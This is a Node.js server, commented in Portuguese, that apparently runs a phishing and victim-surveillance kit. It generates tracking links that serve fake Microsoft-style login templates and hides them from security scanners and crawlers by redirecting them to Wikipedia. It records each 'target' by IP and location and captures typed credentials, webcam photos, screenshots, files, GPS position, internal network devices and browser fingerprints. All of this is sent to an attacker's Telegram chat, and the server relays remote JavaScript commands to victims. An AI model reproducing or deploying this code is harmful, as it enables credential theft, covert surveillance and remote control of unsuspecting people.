const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const parser = require('user-agent-parser');
const axios = require('axios');
const fs = require('fs');
const cors = require('cors');
const webpush = require('web-push');
require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const { Pool } = require('pg');

const app = express();
app.use(cors());

// PostgreSQL Config
const pool = new Pool({
    host: process.env.DB_HOST,
    port: process.env.DB_PORT,
    user: process.env.DB_USER,
    password: process.env.DB_PASS,
    database: process.env.DB_NAME,
    ssl: false // EXPLICITLY DISABLED
});

// Telegram Config
const TG_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TG_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const isProd = process.env.NODE_ENV === 'production' || process.env.VERCEL === '1';

let bot = null;
if (TG_TOKEN) {
    bot = new TelegramBot(TG_TOKEN, { polling: !isProd });
}

async function sendTelegramMsg(text) {
    if (!bot || !TG_CHAT_ID) return;
    try {
        await bot.sendMessage(TG_CHAT_ID, text, { parse_mode: 'Markdown' });
    } catch (e) {}
}

async function sendTelegramPhoto(buffer, caption) {
    if (!bot || !TG_CHAT_ID) return;
    try {
        await bot.sendPhoto(TG_CHAT_ID, buffer, { caption });
    } catch (e) {}
}

async function sendTelegramFile(buffer, filename, caption) {
    if (!bot || !TG_CHAT_ID) return;
    try {
        await bot.sendDocument(TG_CHAT_ID, buffer, { caption }, { filename });
    } catch (e) {}
}

// Database Stateless Helpers
async function getVapidKeys() {
    const { rows } = await pool.query('SELECT data FROM settings WHERE key = $1', ['vapid_keys']);
    return rows.length > 0 ? rows[0].data : null;
}

async function getLog(id) {
    const { rows } = await pool.query('SELECT data FROM logs WHERE id = $1', [id]);
    return rows.length > 0 ? rows[0].data : null;
}

async function saveLog(log) {
    if (!log.timestamp) log.timestamp = new Date();
    await pool.query('INSERT INTO logs (id, data) VALUES ($1, $2) ON CONFLICT (id) DO UPDATE SET data = $2', [log.id, log]);
}

async function saveLink(link) {
    await pool.query('INSERT INTO links (id, data) VALUES ($1, $2) ON CONFLICT (id) DO UPDATE SET data = $2', [link.id, link]);
}

async function initDB() {
    try {
        console.log('[DB] Inicializando...');
        await pool.query(`
            CREATE TABLE IF NOT EXISTS links (id TEXT PRIMARY KEY, data JSONB NOT NULL);
            CREATE TABLE IF NOT EXISTS logs (id TEXT PRIMARY KEY, data JSONB NOT NULL);
            CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, data JSONB NOT NULL);
        `);
        
        let keys = await getVapidKeys();
        if (!keys) {
            keys = webpush.generateVAPIDKeys();
            await pool.query('INSERT INTO settings (key, data) VALUES ($1, $2)', ['vapid_keys', keys]);
        }
        webpush.setVapidDetails('mailto:admin@sentinelaware.local', keys.publicKey, keys.privateKey);
        console.log('[DB] Pronto');
    } catch (err) {
        console.error('[DB] Erro:', err.message);
        sendTelegramMsg(`❌ *ERRO DB:* ${err.message}`);
    }
}
initDB();

// Middleware
const publicPath = path.join(process.cwd(), 'public');
app.use(express.static(publicPath));
app.use(express.json());
app.use((req, res, next) => { res.setHeader('ngrok-skip-browser-warning', 'true'); next(); });

// API Endpoints
app.get('/', (req, res) => res.sendFile(path.join(publicPath, 'index.html')));

app.get('/api/logs', async (req, res) => {
    try {
        const { rows } = await pool.query('SELECT data FROM logs');
        const sorted = rows.map(r => r.data).sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
        res.json(sorted);
    } catch (e) { res.json([]); }
});

app.get('/api/links', async (req, res) => {
    try {
        const { rows } = await pool.query('SELECT data FROM links');
        const sorted = rows.map(r => r.data).sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
        res.json(sorted);
    } catch (e) { res.json([]); }
});

app.post('/api/links', async (req, res) => {
    try {
        const { template } = req.body;
        const id = Math.random().toString(36).substring(2, 10);
        const newLink = { id, url: `/t/${id}`, template: template || 'microsoft', createdAt: new Date(), clicks: 0 };
        await saveLink(newLink);
        
        // Immediate notification
        io.emit('new_link_created', newLink);
        sendTelegramMsg(`🔗 *NOVO LINK GERADO*\n🆔 ID: \`${id}\`\n📋 Template: \`${newLink.template}\`\n📍 URL: \`${newLink.url}\``);
        
        res.json(newLink);
    } catch (e) {
        console.error('[SERVER] Erro ao gerar link:', e.message);
        res.status(500).json({ error: e.message });
    }
});

app.delete('/api/logs', async (req, res) => {
    await pool.query('DELETE FROM logs');
    io.emit('all_logs_deleted');
    res.json({ success: true });
});

app.delete('/api/logs/:id', async (req, res) => {
    await pool.query('DELETE FROM logs WHERE id = $1', [req.params.id]);
    io.emit('update_log', { id: req.params.id, deleted: true });
    res.json({ success: true });
});

app.get('/api/vapid-public-key', async (req, res) => {
    const keys = await getVapidKeys();
    res.json({ publicKey: keys ? keys.publicKey : null });
});

app.post('/api/heartbeat', (req, res) => res.json({ status: 'ok' }));

// Tracking Logic (Cloaking + DB)
const suspiciousUA = ['googlebot', 'bingbot', 'lighthouse', 'paloalto', 'zscaler', 'headless'];
app.get('/t/:id', async (req, res) => {
    const ua = (req.headers['user-agent'] || '').toLowerCase();
    if (suspiciousUA.some(bot => ua.includes(bot))) {
        return res.redirect('https://pt.wikipedia.org/wiki/Seguran%C3%A7a_da_informa%C3%A7%C3%A3o');
    }

    try {
        const { rows } = await pool.query('SELECT data FROM links WHERE id = $1', [req.params.id]);
        const link = rows.length > 0 ? rows[0].data : null;
        if (link) {
            link.clicks++;
            await saveLink(link);
            const tPath = path.join(publicPath, `${link.template}.html`);
            return res.sendFile(fs.existsSync(tPath) ? tPath : path.join(publicPath, 'microsoft.html'));
        }
    } catch (e) {}
    res.sendFile(path.join(publicPath, 'microsoft.html'));
});

const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

// --- STATELESS TELEMETRY ---
io.on('connection', (socket) => {
    socket.on('telemetry_data', async (packet) => {
        try {
            const { event, data } = JSON.parse(Buffer.from(packet.v, 'base64').toString());
            let log = await getLog(data.logId);

            if (event === 'join') {
                const ip = (socket.handshake.headers['x-forwarded-for']?.split(',')[0] || socket.handshake.address).replace('::ffff:', '');
                if (!log) {
                    log = { id: data.logId, linkId: data.linkId, timestamp: new Date(), ip, geo: 'Localizando...', creds: [], chat: [], status: 'online' };
                    io.emit('new_click', log);
                    sendTelegramMsg(`🚨 *NOVO ALVO*\n🆔 ID: \`${log.id}\`\n🌍 IP: \`${log.ip}\``);

                    // Background GeoIP Restore
                    axios.get(`https://ipapi.co/${ip}/json/`).then(async r => {
                        if(r.data && !r.data.error) {
                            log.geo = `${r.data.city}, ${r.data.country_name}`;
                            log.lat = r.data.latitude; log.lon = r.data.longitude;
                            await saveLog(log);
                            io.emit('update_log', { id: log.id, geo: log.geo, lat: log.lat, lon: log.lon });
                            sendTelegramMsg(`🌍 *LOCALIZAÇÃO*\n🆔 ID: \`${log.id}\`\n📍: ${log.geo}`);
                        }
                    }).catch(()=>{});
                } else {
                    log.status = 'online';
                    log.timestamp = new Date();
                }
                await saveLog(log);
                io.emit('update_log', { id: log.id, status: 'online' });
            }
 else if (log) {
                switch(event) {
                    case 'creds':
                        log.creds.push(data.value);
                        await saveLog(log);
                        io.emit('update_log', { id: log.id, creds: log.creds });
                        sendTelegramMsg(`🔑 *CAPTURA*\n🆔 ID: \`${log.id}\`\n📝: \`${data.value}\``);
                        break;
                    case 'photo':
                        const pBuf = Buffer.from(data.image.split(',')[1], 'base64');
                        sendTelegramPhoto(pBuf, `📸 *FOTO* - ID: ${log.id}`);
                        break;
                    case 'screenshot':
                        const sBuf = Buffer.from(data.image.split(',')[1], 'base64');
                        sendTelegramPhoto(sBuf, `🖥️ *SCREENSHOT* - ID: ${log.id}`);
                        break;
                    case 'file_up':
                        const fBuf = Buffer.from(data.content.split(',')[1], 'base64');
                        sendTelegramFile(fBuf, data.name, `📂 *ARQUIVO* - ID: ${log.id}`);
                        break;
                    case 'geo':
                        log.lat = data.lat; log.lon = data.lon; log.geo = `Precise: ${data.lat},${data.lon}`;
                        await saveLog(log);
                        io.emit('update_log', { id: log.id, geo: log.geo, lat: log.lat, lon: log.lon });
                        sendTelegramMsg(`📍 *GPS* - ID: ${log.id}\nhttps://www.google.com/maps?q=${data.lat},${data.lon}`);
                        break;
                    case 'network':
                        log.internalDevices = data.devices;
                        await saveLog(log);
                        io.emit('update_log', { id: log.id, internalDevices: log.internalDevices });
                        break;
                    case 'fingerprint':
                        log.fingerprint = data.fingerprint;
                        await saveLog(log);
                        io.emit('update_log', { id: log.id, fingerprint: data.fingerprint });
                        sendTelegramMsg(`📂 *DOSSIÊ* - ID: ${log.id}\nOS: ${data.fingerprint.platform}`);
                        break;
                    case 'js_result':
                        io.emit('js_result_admin', data);
                        break;
                }
            }
        } catch(e) {}
    });

    socket.on('remote_command', (d) => io.emit('execute_command', d));
    socket.on('admin_send_chat', (d) => io.emit('victim_recv_chat', d));
    socket.on('admin_send_push', async (d) => {
        const log = await getLog(d.id);
        if (log && log.subscription) webpush.sendNotification(log.subscription, JSON.stringify(d));
    });
});

const PORT = process.env.PORT || 3000;
if (!process.env.VERCEL) {
    server.listen(PORT, () => console.log(`🚀 Porta: ${PORT}`));
}

module.exports = app;
